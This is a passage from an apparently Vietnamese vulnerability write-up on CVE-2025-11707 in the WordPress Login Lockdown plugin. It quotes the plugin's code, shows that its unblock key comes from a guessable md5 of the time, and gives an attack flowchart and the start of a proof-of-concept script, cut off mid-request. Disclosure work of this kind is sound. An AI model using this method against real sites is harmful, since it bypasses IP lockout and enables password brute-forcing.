th·ª±c&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-22-cve-2025-11707/blocked.png&#34; title=&#34;Blocked&#34; data-thumbnail=&#34;/posts/2026-01-22-cve-2025-11707/blocked.png&#34; data-sub-html=&#34;&lt;h2&gt;Blocked&lt;/h2&gt;&lt;p&gt;Blocked&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-22-cve-2025-11707/blocked.png&#39; alt=&#34;Blocked&#34; height=&#34;483&#34; width=&#34;422&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Blocked&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;get-unlock-key&#34;&gt;&lt;span&gt;Get Unlock Key&lt;/span&gt;&#xA;  &lt;a href=&#34;#get-unlock-key&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;ƒê·ªÉ k√≠ch ho·∫°t quy tr√¨nh m·ªü kh√≥a, ng∆∞·ªùi d√πng ph·∫£i g·ª≠i form recovery k√®m theo &lt;strong&gt;email c·ªßa m·ªôt t√†i kho·∫£n administrator&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!isset($_POST[&amp;#39;loginlockdown_recovery_email&amp;#39;]) || !filter_var(wp_unslash($_POST[&amp;#39;loginlockdown_recovery_email&amp;#39;]), FILTER_VALIDATE_EMAIL)) {&#xA;  $display_message = &amp;#39;&amp;lt;p class=&amp;#34;error&amp;#34;&amp;gt;Invalid email address.&amp;lt;/p&amp;gt;&amp;#39;;&#xA;} else {&#xA;  $email = sanitize_text_field(wp_unslash($_POST[&amp;#39;loginlockdown_recovery_email&amp;#39;]));&#xA;  $user = get_user_by(&amp;#39;email&amp;#39;, $email);        &#xA;  if (user_can($user, &amp;#39;administrator&amp;#39;)) {&#xA;    $unblock_key = md5(time() . wp_rand(10000, 9999));&#xA;    $unblock_attempts = get_transient(&amp;#39;loginlockdown_unlock_count_&amp;#39; . $user-&amp;gt;ID);&#xA;    if (!$unblock_attempts) {&#xA;      $unblock_attempts = 0;&#xA;    }&#xA;&#xA;    $unblock_attempts&amp;#43;&amp;#43;;&#xA;    set_transient(&amp;#39;loginlockdown_unlock_count_&amp;#39; . $user-&amp;gt;ID, $unblock_attempts, HOUR_IN_SECONDS);&#xA;&#xA;    if ($unblock_attempts &amp;lt;= 3) {&#xA;      set_transient(&amp;#39;loginlockdown_unlock_&amp;#39; . $unblock_key, $unblock_key, HOUR_IN_SECONDS);&#xA;&#xA;      $unblock_url = add_query_arg(array(&amp;#39;loginlockdown_unblock&amp;#39; =&amp;gt; $unblock_key), wp_login_url());&#xA;&#xA;      $subject  = &amp;#39;Login Lockdown unblock instructions for &amp;#39; . site_url();&#xA;      $message  = &amp;#39;&amp;lt;p&amp;gt;The IP &amp;#39; . LoginLockdown_Utility::getUserIP() . &amp;#39; has been locked down and someone submitted an unblock request using your email address &amp;lt;strong&amp;gt;&amp;#39; . $email . &amp;#39;&amp;lt;/strong&amp;gt;&amp;lt;/p&amp;gt;&amp;#39;;&#xA;      $message .= &amp;#39;&amp;lt;p&amp;gt;If this was you, and you have locked yourself out please click &amp;lt;a target=&amp;#34;_blank&amp;#34; href=&amp;#34;&amp;#39; . $unblock_url . &amp;#39;&amp;#34;&amp;gt;this link&amp;lt;/a&amp;gt; which is valid for 1 hour.&amp;lt;/p&amp;gt;&amp;#39;;&#xA;      $message .= &amp;#39;&amp;lt;p&amp;gt;Please note that for security reasons, this will only unblock the IP of the person opening the link, not the IP of the person who submitted the unblock request. To unblock someone else please do so on the &amp;lt;a href=&amp;#34;&amp;#39; . admin_url(&amp;#39;options-general.php?page=loginlockdown#loginlockdown_activity&amp;#39;) . &amp;#39;&amp;#34;&amp;gt;Login Lockdown Activity Page&amp;lt;/p&amp;gt;&amp;#39;;&#xA;&#xA;      add_filter(&amp;#39;wp_mail_content_type&amp;#39;, function () {&#xA;        return &amp;#34;text/html&amp;#34;;&#xA;      });&#xA;&#xA;      wp_mail($user-&amp;gt;user_email, $subject, $message);&#xA;    }&#xA;  } else {&#xA;    // If no admin using the submitted email exists, ignore silently&#xA;  }&#xA;&#xA;  if (isset($unblock_attempts) &amp;amp;&amp;amp; $unblock_attempts &amp;gt; 3) {&#xA;    $display_message = &amp;#39;&amp;lt;p class=&amp;#34;error&amp;#34;&amp;gt;You have already attempted to unblock yourself recently, please wait 1 hour before trying again.&amp;lt;/p&amp;gt;&amp;#39;;&#xA;  } else {&#xA;    $display_message = &amp;#39;&amp;lt;p&amp;gt;If an administrator having the email address &amp;lt;strong&amp;gt;&amp;#39; . $email . &amp;#39;&amp;lt;/strong&amp;gt; exists, an email has been sent with instructions to regain access.&amp;lt;/p&amp;gt;&amp;#39;;&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;X√°c minh email c√≥ thu·ªôc v·ªÅ administrator hay kh√¥ng&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$email = sanitize_text_field(wp_unslash($_POST[&amp;#39;loginlockdown_recovery_email&amp;#39;]));&#xA;$user = get_user_by(&amp;#39;email&amp;#39;, $email);&#xA;&#xA;if (user_can($user, &amp;#39;administrator&amp;#39;)) &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ch·ªâ khi email thu·ªôc v·ªÅ t√†i kho·∫£n c√≥ quy·ªÅn &lt;strong&gt;administrator&lt;/strong&gt; th√¨ h·ªá th·ªëng m·ªõi ti·∫øp t·ª•c sinh unlock key v√† g·ª≠i email.&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Gi·ªõi h·∫°n s·ªë l·∫ßn y√™u c·∫ßu m·ªü kh√≥a&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$unblock_attempts = get_transient(&amp;#39;loginlockdown_unlock_count_&amp;#39; . $user-&amp;gt;ID);&#xA;$unblock_attempts&amp;#43;&amp;#43;;&#xA;set_transient(&amp;#39;loginlockdown_unlock_count_&amp;#39; . $user-&amp;gt;ID, $unblock_attempts, HOUR_IN_SECONDS);&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Gi·ªõi h·∫°n: t·ªëi ƒëa &lt;strong&gt;3 l·∫ßn / 1 gi·ªù / m·ªói admin&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;B·ªô ƒë·∫øm g·∫Øn v·ªõi &lt;code&gt;user_id&lt;/code&gt;, kh√¥ng g·∫Øn v·ªõi &lt;strong&gt;IP ƒëang b·ªã block&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; N·∫øu t·ªìn t·∫°i nhi·ªÅu t√†i kho·∫£n admin, m·ªói t√†i kho·∫£n c√≥ quota ri√™ng, d·ªÖ b·ªã l·∫°m d·ª•ng.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sinh &lt;code&gt;unblock_key&lt;/code&gt; v√† l∆∞u transient&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$unblock_key = md5(time() . wp_rand(10000, 9999));&#xA;set_transient(&amp;#39;loginlockdown_unlock_&amp;#39; . $unblock_key, $unblock_key, HOUR_IN_SECONDS);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;unblock_key&lt;/code&gt; ƒë∆∞·ª£c t·∫°o t·ª´:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;time()&lt;/code&gt; =&amp;gt; timestamp theo gi√¢y (d·ªÖ ƒëo√°n)&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_rand(10000, 9999)&lt;/code&gt; =&amp;gt; ch·ªâ tr·∫£ v·ªÅ 2 gi√° tr·ªã: &lt;code&gt;9999&lt;/code&gt; v√† &lt;code&gt;10000&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Hash MD5 =&amp;gt; kh√¥ng l√†m tƒÉng entropy&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Key ch·ªâ ƒë∆∞·ª£c l∆∞u ƒë∆°n l·∫ª trong transient, kh√¥ng g·∫Øn v·ªõi IP hay user.&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; Ch·ªâ c·∫ßn ƒëo√°n ƒë√∫ng key c√≤n hi·ªáu l·ª±c trong 1 gi·ªù l√† c√≥ th·ªÉ k√≠ch ho·∫°t unblock cho IP hi·ªán t·∫°i.&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;G·ª≠i link m·ªü kh√≥a qua email&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$unblock_url = wp-login.php?loginlockdown_unblock=&amp;lt;key&amp;gt;&#xA;wp_mail($user-&amp;gt;user_email, ...);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Email ch·ª©a link m·ªü kh√≥a c√≥ hi·ªáu l·ª±c trong 1 gi·ªù.&#xA;Theo thi·∫øt k·∫ø, admin ph·∫£i b·∫•m link tr√™n &lt;strong&gt;IP ƒëang b·ªã kh√≥a&lt;/strong&gt; ƒë·ªÉ m·ªü kh√≥a IP ƒë√≥.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi ch√∫&lt;/p&gt;&lt;p&gt;Nh∆∞ v·∫≠y, k·∫ª t·∫•n c√¥ng &lt;strong&gt;kh√¥ng c·∫ßn truy c·∫≠p email c·ªßa administrator&lt;/strong&gt;.&#xA;Ch·ªâ c·∫ßn &lt;strong&gt;g·ª≠i y√™u c·∫ßu m·ªü kh√≥a ƒë·ªÉ k√≠ch ho·∫°t qu√° tr√¨nh sinh &lt;code&gt;unblock_key&lt;/code&gt;&lt;/strong&gt;, ƒë·ªìng th·ªùi &lt;strong&gt;t·ª± sinh c√°c gi√° tr·ªã key theo ƒë√∫ng thu·∫≠t to√°n trong code&lt;/strong&gt; (d·ª±a tr√™n &lt;code&gt;time()&lt;/code&gt; v√† &lt;code&gt;wp_rand()&lt;/code&gt;), r·ªìi th·ª≠ tr·ª±c ti·∫øp tr√™n endpoint:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp-login.php?loginlockdown_unblock=&amp;lt;key&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi ƒëo√°n tr√∫ng m·ªôt &lt;code&gt;unblock_key&lt;/code&gt; c√≤n hi·ªáu l·ª±c trong transient, IP hi·ªán t·∫°i s·∫Ω ƒë∆∞·ª£c &lt;strong&gt;m·ªü kh√≥a ngay l·∫≠p t·ª©c&lt;/strong&gt;, t·ª´ ƒë√≥ c√≥ th·ªÉ ti·∫øp t·ª•c th·ª±c hi·ªán c√°c l·∫ßn ƒëƒÉng nh·∫≠p th·ª≠ m·∫≠t kh·∫©u.&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng &lt;strong&gt;li√™n t·ª•c t·ª± m·ªü kh√≥a cho ch√≠nh m√¨nh&lt;/strong&gt;, v√¥ hi·ªáu h√≥a ho√†n to√†n c∆° ch·∫ø ch·∫∑n IP c·ªßa plugin.&lt;/p&gt;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;unlock&#34;&gt;&lt;span&gt;Unlock&lt;/span&gt;&#xA;  &lt;a href=&#34;#unlock&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Plugin ƒëƒÉng k√Ω hook ·ªü giai ƒëo·∫°n r·∫•t s·ªõm c·ªßa v√≤ng ƒë·ªùi request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;init&amp;#39;, array(&amp;#39;loginlockdown&amp;#39;, &amp;#39;init&amp;#39;), -1);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong h√†m &lt;code&gt;init()&lt;/code&gt;, plugin g·ªçi tr·ª±c ti·∫øp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;LoginLockdown_Functions::handle_unblock();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu n√†y c√≥ nghƒ©a l√† &lt;strong&gt;m·ªçi request t·ªõi WordPress&lt;/strong&gt;, k·ªÉ c·∫£ tr∆∞·ªõc khi hi·ªÉn th·ªã trang ƒëƒÉng nh·∫≠p hay ki·ªÉm tra x√°c th·ª±c, ƒë·ªÅu s·∫Ω ch·∫°y logic m·ªü kh√≥a n·∫øu t·ªìn t·∫°i tham s·ªë:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;?loginlockdown_unblock=...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;=&amp;gt; Ch·ªâ c·∫ßn g·ª≠i m·ªôt HTTP request b·∫•t k·ª≥ t·ªõi site k√®m tham s·ªë n√†y l√† c√≥ th·ªÉ k√≠ch ho·∫°t logic unblock.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;static function handle_unblock()&#xA;{&#xA;  global $wpdb;&#xA;  //phpcs:ignore missing nonce as this is called via a link in email or stored by user&#xA;  $options = LoginLockdown_Setup::get_options();&#xA;  if (isset($_GET[&amp;#39;loginlockdown_unblock&amp;#39;]) &amp;amp;&amp;amp; $options[&amp;#39;global_unblock_key&amp;#39;] === sanitize_text_field(wp_unslash($_GET[&amp;#39;loginlockdown_unblock&amp;#39;]))) { //phpcs:ignore&#xA;    $user_ip = LoginLockdown_Utility::getUserIP();&#xA;    if (!in_array($user_ip, $options[&amp;#39;whitelist&amp;#39;])) {&#xA;      $options[&amp;#39;whitelist&amp;#39;][] = LoginLockdown_Utility::getUserIP();&#xA;    }&#xA;    update_option(LOGINLOCKDOWN_OPTIONS_KEY, $options);&#xA;  }&#xA;&#xA;  if (isset($_GET[&amp;#39;loginlockdown_unblock&amp;#39;]) &amp;amp;&amp;amp; strlen($_GET[&amp;#39;loginlockdown_unblock&amp;#39;]) == 32) { //phpcs:ignore&#xA;    $unblock_key = sanitize_key(wp_unslash($_GET[&amp;#39;loginlockdown_unblock&amp;#39;])); //phpcs:ignore&#xA;    $unblock_transient = get_transient(&amp;#39;loginlockdown_unlock_&amp;#39; . $unblock_key);&#xA;    if ($unblock_transient == $unblock_key) {&#xA;      $user_ip = LoginLockdown_Utility::getUserIP();&#xA;      //phpcs:ignore no need to cache&#xA;      $wpdb-&amp;gt;delete( //phpcs:ignore&#xA;        $wpdb-&amp;gt;lockdown_lockdowns,&#xA;        array(&#xA;          &amp;#39;lockdown_IP&amp;#39; =&amp;gt; $user_ip&#xA;        )&#xA;      );&#xA;&#xA;      if (!in_array($user_ip, $options[&amp;#39;whitelist&amp;#39;])) {&#xA;        $options[&amp;#39;whitelist&amp;#39;][] = LoginLockdown_Utility::getUserIP();&#xA;      }&#xA;&#xA;      update_option(LOGINLOCKDOWN_OPTIONS_KEY, $options);&#xA;    }&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y h·ªó tr·ª£ hai c∆° ch·∫ø m·ªü kh√≥a IP.&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;M·ªü kh√≥a b·∫±ng Global Unblock Key&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($_GET[&amp;#39;loginlockdown_unblock&amp;#39;]) &#xA;    &amp;amp;&amp;amp; $options[&amp;#39;global_unblock_key&amp;#39;] === sanitize_text_field($_GET[&amp;#39;loginlockdown_unblock&amp;#39;])) {&#xA;&#xA;    $user_ip = LoginLockdown_Utility::getUserIP();&#xA;    if (!in_array($user_ip, $options[&amp;#39;whitelist&amp;#39;])) {&#xA;        $options[&amp;#39;whitelist&amp;#39;][] = $user_ip;&#xA;    }&#xA;    update_option(LOGINLOCKDOWN_OPTIONS_KEY, $options);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;N·∫øu tham s·ªë tr√πng v·ªõi &lt;strong&gt;global key trong c·∫•u h√¨nh&lt;/strong&gt;, IP hi·ªán t·∫°i s·∫Ω ƒë∆∞·ª£c:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Th√™m v√†o whitelist&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng c√≤n b·ªã block vƒ©nh vi·ªÖn&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;C∆° ch·∫ø n√†y ho√†n to√†n ph·ª• thu·ªôc v√†o vi·ªác gi·ªØ b√≠ m·∫≠t &lt;strong&gt;global key&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-22-cve-2025-11707/global.png&#34; title=&#34;Global key&#34; data-thumbnail=&#34;/posts/2026-01-22-cve-2025-11707/global.png&#34; data-sub-html=&#34;&lt;h2&gt;Global key&lt;/h2&gt;&lt;p&gt;Global key&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-22-cve-2025-11707/global.png&#39; alt=&#34;Global key&#34; height=&#34;620&#34; width=&#34;1133&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Global key&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;M·ªü kh√≥a b·∫±ng Recovery Key (Transient)&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($_GET[&amp;#39;loginlockdown_unblock&amp;#39;]) &amp;amp;&amp;amp; strlen($_GET[&amp;#39;loginlockdown_unblock&amp;#39;]) == 32) {&#xA;    $unblock_key = sanitize_key($_GET[&amp;#39;loginlockdown_unblock&amp;#39;]);&#xA;    $unblock_transient = get_transient(&amp;#39;loginlockdown_unlock_&amp;#39; . $unblock_key);&#xA;&#xA;    if ($unblock_transient == $unblock_key) {&#xA;        $wpdb-&amp;gt;delete($wpdb-&amp;gt;lockdown_lockdowns, array(&amp;#39;lockdown_IP&amp;#39; =&amp;gt; $user_ip));&#xA;&#xA;        if (!in_array($user_ip, $options[&amp;#39;whitelist&amp;#39;])) {&#xA;            $options[&amp;#39;whitelist&amp;#39;][] = $user_ip;&#xA;        }&#xA;        update_option(LOGINLOCKDOWN_OPTIONS_KEY, $options);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒê√¢y l√† c∆° ch·∫ø m·ªü kh√≥a d·ª±a tr√™n &lt;strong&gt;recovery key ƒë∆∞·ª£c l∆∞u trong transient&lt;/strong&gt;.&#xA;Plugin ch·ªâ ki·ªÉm tra hai ƒëi·ªÅu ki·ªán:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Tham s·ªë &lt;code&gt;loginlockdown_unblock&lt;/code&gt; c√≥ ƒë·ªô d√†i ƒë√∫ng &lt;strong&gt;32 k√Ω t·ª±&lt;/strong&gt; (d·∫°ng MD5)&lt;/li&gt;&#xA;&lt;li&gt;T·ªìn t·∫°i transient &lt;code&gt;loginlockdown_unlock_&amp;lt;key&amp;gt;&lt;/code&gt; v·ªõi gi√° tr·ªã tr√πng kh·ªõp&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;N·∫øu th·ªèa m√£n, IP hi·ªán t·∫°i s·∫Ω ƒë∆∞·ª£c:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;X√≥a kh·ªèi b·∫£ng &lt;code&gt;lockdown_lockdowns&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Th√™m v√†o whitelist&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;=&amp;gt; IP ƒë∆∞·ª£c m·ªü kh√≥a ngay l·∫≠p t·ª©c v√† kh√¥ng c√≤n b·ªã ch·∫∑n trong c√°c l·∫ßn ƒëƒÉng nh·∫≠p ti·∫øp theo.&lt;/p&gt;&#xA;&lt;p&gt;Key n√†y ƒë√£ ƒë∆∞·ª£c ta ph√¢n t√≠ch ·ªü ph·∫ßn tr∆∞·ªõc ƒë√≥.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Trigger multiple failed logins&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;IP reaches max_login_retries&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;IP is blocked (lockdown_lockdowns)&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Send recovery POST with admin email&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Plugin generates unblock_key = md5(time &amp;#43; wp_rand)&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Store transient loginlockdown_unlock_key (1 hour)&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Attacker brute-forces keys in ¬±1s window&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Send GET /?loginlockdown_unblock=guessed_key&amp;#34;]&#xA;&#xA;I --&amp;gt; J{&amp;#34;Transient exists &amp;amp; matches?&amp;#34;}&#xA;&#xA;J --&amp;gt;|Yes| K[&amp;#34;Delete IP from lockdown_lockdowns&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Add IP to whitelist&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;IP fully unblocked&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;T·∫°o file &lt;code&gt;gen_key.php&lt;/code&gt; ƒë·ªÉ ƒëo√°n unlock key sau khi b·ªã block&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;&#xA;$url = &amp;#34;http://localhost/wp-login.php&amp;#34;;&#xA;&#xA;$data = http_build_query([&#xA;    &amp;#34;loginlockdown_recovery_email&amp;#34;  =&amp;gt; &amp;#34;admin_email&amp;#34;,&#xA;    &amp;#34;loginlockdown_recovery_submit&amp;#34; =&amp;gt; &amp;#34;Send unblock email&amp;#34;,&#xA;    &amp;#34;loginlockdown_recovery_nonce&amp;#34;  =&amp;gt; &amp;#34;valid_nonce&amp;#34;,&#xA;    &amp;#34;_wp_http_referer&amp;#34;               =&amp;gt; &amp;#34;/wp-login.php&amp;#34;,&#xA;]);&#xA;&#xA;$opts = [&#xA;    &amp;#34;http&amp;#34; =&amp;gt; [&#xA;        &amp;#34;method&amp;#34;  =&amp;gt; &amp;#34;POST&amp;#34;,&#xA;        &amp;#34;header&amp;#34;  =&amp;gt;&#xA;            &amp;#34;Content-Type: application/x-www-form-urlencoded\r\n&amp;#34; .&#xA;            &amp;#34;Referer: http://localhost/wp-login.php\r\n&amp;#34; .&#xA;            &amp;#34;User-Agent: PHP\r\n&amp;#34; .&#xA;            &amp;#34;Cookie: 